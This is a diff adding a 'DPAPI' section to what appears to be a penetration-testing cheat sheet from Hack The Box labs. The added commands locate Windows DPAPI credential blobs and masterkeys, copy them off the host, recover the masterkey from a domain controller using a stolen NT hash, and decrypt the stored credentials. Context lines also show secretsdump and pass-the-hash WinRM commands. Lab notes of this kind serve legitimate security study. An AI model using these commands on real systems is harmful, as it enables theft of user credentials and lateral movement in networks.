@@ -2058,6 +2058,18 @@ impacket-secretsdump htb/svc-alfresco@forest
 nxc winrm <IP1> <IP2> <IP3> -d <DOMAIN> -u '<USERNAME>' -H '<HASH>'
 ```
 ---
+### DPAPI
+```bash
+- Identify DPAPI credential blobs: `Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Credentials" -Force`
+- Identify DPAPI masterkeys: `Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force`
+- Note the user's SID: `whoami /user`
+- Match the credential blob's MasterKey GUID to the corresponding file under `AppData\Roaming\Microsoft\Protect\<SID>\`.
+- Transfer the credential blob to Kali: `download C:\Users\<user>\AppData\Local\Microsoft\Credentials\<CRED_BLOB>`
+- Transfer the matching masterkey to Kali: `download C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<MASTERKEY_GUID>`
+- Clear unintended Kerberos cache usage: `unset KRB5CCNAME`
+- Recover domain user's masterkey via DC using NTLM: `/usr/bin/impacket-dpapi masterkey -file masterkey -t 'DOMAIN/user@DC.FQDN' -hashes ':NTHASH' -dc-ip <DC_IP> -no-pass`
+- Decrypt the credential blob: `/usr/bin/impacket-dpapi credential -file credblob -key '<DECRYPTED_MASTERKEY>'`
+```
 ### Ligolo-Ng
 
 ## Lab Topology
